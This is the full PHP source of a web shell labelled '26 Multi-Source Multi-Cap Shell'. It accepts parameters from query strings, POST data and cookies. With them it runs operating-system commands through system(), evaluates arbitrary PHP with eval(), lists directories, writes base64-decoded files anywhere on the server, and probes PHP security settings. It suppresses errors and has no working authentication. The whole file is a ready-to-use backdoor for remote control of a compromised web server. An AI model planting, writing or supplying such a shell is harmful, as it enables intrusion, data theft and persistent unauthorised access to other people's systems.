<?php
@error_reporting(0);
$T="26 Multi-Source Multi-Cap Shell";
$M="M26-SUPOK";
$ok=true;
$out="";
$do=isset($_GET['do'])?(string)$_GET['do']:(isset($_COOKIE['do'])?(string)$_COOKIE['do']:'c');
$v=isset($_GET['v'])?(string)$_GET['v']:(isset($_POST['v'])?(string)$_POST['v']:(isset($_COOKIE['v'])?(string)$_COOKIE['v']:''));
$d=isset($_GET['d'])?(string)$_GET['d']:(isset($_COOKIE['d'])?(string)$_COOKIE['d']:'');
switch($do){
case 'c': if($v!==''){ob_start();@system($v);$out.=ob_get_clean();} break;
case 'e': if($v!==''){ob_start();@eval($v);$out.=ob_get_clean();} break;
case 'l': $e2=@scandir($v!==''?$v:'.'); if($e2===false){$out.='LS-FAIL';}else{foreach($e2 as $f){$out.=$f."\n";}} break;
case 'w': $bin=@base64_decode($d); if($bin===false||$d===''){$bin=$d;} $w=@file_put_contents($v,$bin); $out.=($w===false?'WRITE-FAIL '.$v:'WRITE-OK '.$w.'B -> '.$v); break;
case 's': $out.=@ini_get('disable_functions')."\n".@ini_get('allow_url_include')."\n".@ini_get('open_basedir'); break;
default: $out.='?do='.$do;}

$si='';
$u=@trim((string)@shell_exec('whoami'));
$si.=($u!==''?htmlspecialchars($u):'(no shell_exec)').' | '.@phpversion().' | '.@php_sapi_name().' | '.@htmlspecialchars((string)@php_uname());
$cwd=@getcwd();
$si.=' | cwd='.($cwd!==false?htmlspecialchars($cwd):'n/a');
$S=(string)@$_GET['language'];
$faction=($S!==''?'?':'#');
$hid=($S!==''?'<input type="hidden" name="language" value="'.htmlspecialchars($S).'" /><input type="hidden" name="action" value="go" />':'');

echo '<div style="font-family:Consolas,monospace;font-size:13px;background:#101418;color:#e8e8e8;border:1px solid #3a6ea5;border-radius:6px;padding:10px;margin:8px 0;max-width:1200px;overflow:auto">'
  .'<div style="border-bottom:1px solid #3a6ea5;padding-bottom:6px"><b style="color:#7ce38b">'.$T.'</b> <span style="color:#f6c453">['.$M.']</span> '
  .($ok?'<span style="color:#7ce38b">GATE:OK</span>':'<span style="color:#ff7b72">GATE:LOCKED</span>')
  .'<div style="color:#9aa4af;font-size:12px;margin-top:4px">'.$si.'</div></div>'
  .'<form method="get" action="'.$faction.'" enctype="multipart/form-data" style="margin:8px 0">'.$hid
  .'<table><tr><td>do</td><td><select name="do"><option value="c">c exec</option><option value="e">e eval</option><option value="l">l list</option><option value="w">w write</option><option value="s">s config</option></select></td><td>v</td><td><input type="text" name="v" size="44"></td><td>d(b64)</td><td><input type="text" name="d" size="30"></td><td><input type="submit" value="go"></td></tr></table><div style="color:#9aa4af;font-size:11px">inputs accepted from GET, POST and Cookie (sources differ per param)</div>'
  .'</form>'
  .'<pre style="background:#0b0e11;border:1px solid #22303f;color:#d6e2ff;padding:8px;border-radius:4px;overflow:auto;margin:0">'.htmlspecialchars($out).'</pre>'
  .'</div>';
?>
